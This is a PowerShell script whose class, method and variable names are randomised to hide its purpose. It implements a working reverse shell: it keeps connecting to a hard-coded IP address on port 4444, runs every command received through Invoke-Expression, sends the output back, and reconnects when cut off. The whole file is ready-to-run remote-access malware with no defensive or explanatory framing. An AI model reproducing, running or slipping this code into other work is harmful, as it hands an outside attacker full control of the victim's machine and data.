class wkhHOIKtFYOJ {
    
    [string]$RYzYgmUFHhgw = "93.49.240.195"
    [int]$CBmJfHWXPJxMxgZytwSEiCdl = 4444

    $AfJMdsKkJlQzJPT
    $zrcSSgSUlUUNDaOqvKYx
    $dctbtbuKZBelIAUWkbKUM
    $cOnARE
    $yxEzjUXzpnQMUr
    $oShJeiweXwSzBwFSdWol
    [int]$YkhSLYCFWGLPmthgRzvinTK = 50*1024

    QbPyYRFo() {
        $this.zrcSSgSUlUUNDaOqvKYx = $false
        while ($true) {
            try {
                $this.zrcSSgSUlUUNDaOqvKYx = New-Object Net.Sockets.TcpClient($this.RYzYgmUFHhgw, $this.CBmJfHWXPJxMxgZytwSEiCdl)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.eAhaWFLqsKzraUNAEcbeR()
    }

    eAhaWFLqsKzraUNAEcbeR() {
        $this.AfJMdsKkJlQzJPT = $this.zrcSSgSUlUUNDaOqvKYx.GetStream()
        $this.cOnARE = New-Object Byte[] $this.YkhSLYCFWGLPmthgRzvinTK
        $this.oShJeiweXwSzBwFSdWol = New-Object Text.UTF8Encoding
        $this.dctbtbuKZBelIAUWkbKUM = New-Object IO.StreamWriter($this.AfJMdsKkJlQzJPT, [Text.Encoding]::UTF8, $this.YkhSLYCFWGLPmthgRzvinTK)
        $this.yxEzjUXzpnQMUr = New-Object System.IO.StreamReader($this.AfJMdsKkJlQzJPT)
        $this.dctbtbuKZBelIAUWkbKUM.AutoFlush = $true
    }

    LQgNnOtBniACeDXznh() {
        $this.QbPyYRFo()
        $this.aqsZVTBOPFAismuJ()
    }

    YYvNkSIOiB($yiFBIttVZzhMpifjBe) {
        try {
            [byte[]]$vlmGsfGRZjFJQ = [text.Encoding]::Ascii.GetBytes($yiFBIttVZzhMpifjBe)
            $this.dctbtbuKZBelIAUWkbKUM.Write($vlmGsfGRZjFJQ, 0, $vlmGsfGRZjFJQ.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.LQgNnOtBniACeDXznh()
        }
    }

    [string] ctWNuxKUFnsygGQUnE() {
        try {
            $KdQnkEsdPZSpfE = $this.AfJMdsKkJlQzJPT.Read($this.cOnARE, 0, $this.YkhSLYCFWGLPmthgRzvinTK)    
            $YzFCeDJCjyHepQBsamk = ($this.oShJeiweXwSzBwFSdWol.GetString($this.cOnARE, 0, $KdQnkEsdPZSpfE))
            return $YzFCeDJCjyHepQBsamk
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.LQgNnOtBniACeDXznh()
            return ""
        }
    }

    [string] DLkNRINFqaTPzZAE($jVYdkkoFwdzJHm) {
        Write-Host $jVYdkkoFwdzJHm
        try { 
            $mAKIa = Invoke-Expression $jVYdkkoFwdzJHm | Out-String
        }
        catch {
            $qaXckRXMK = $_.Exception
            $kftrFSGS = $_.Message
            $mAKIa = "`n$_`n"
        }
        return $mAKIa
    }

    [string] qphAuuZJGgRsxN() {
        $MnjnonnKdNUlNykdQzF = [Environment]::UserName
        $hPdlCBdN = [System.Net.Dns]::GetHostName()
        $kxIJLxIZ = Get-Location
        return "$MnjnonnKdNUlNykdQzF@$hPdlCBdN [$kxIJLxIZ]~$ "
    }

    aqsZVTBOPFAismuJ() {
        while ($this.zrcSSgSUlUUNDaOqvKYx.Connected) {
            $this.YYvNkSIOiB($this.qphAuuZJGgRsxN())         
            $YzFCeDJCjyHepQBsamk = $this.ctWNuxKUFnsygGQUnE()
            $mAKIa = "`n"
            if ([string]::IsNullOrEmpty($YzFCeDJCjyHepQBsamk)) {
                continue
            }
            $mAKIa = $this.DLkNRINFqaTPzZAE($YzFCeDJCjyHepQBsamk)
            $this.YYvNkSIOiB($mAKIa + "`n")
            $this.AfJMdsKkJlQzJPT.Flush()
        }
        $this.zrcSSgSUlUUNDaOqvKYx.Close()
        $this.LQgNnOtBniACeDXznh()
    } 
}

$rIgTwoqfgtTpZdwlSNM = [wkhHOIKtFYOJ]::new()
$rIgTwoqfgtTpZdwlSNM.LQgNnOtBniACeDXznh()
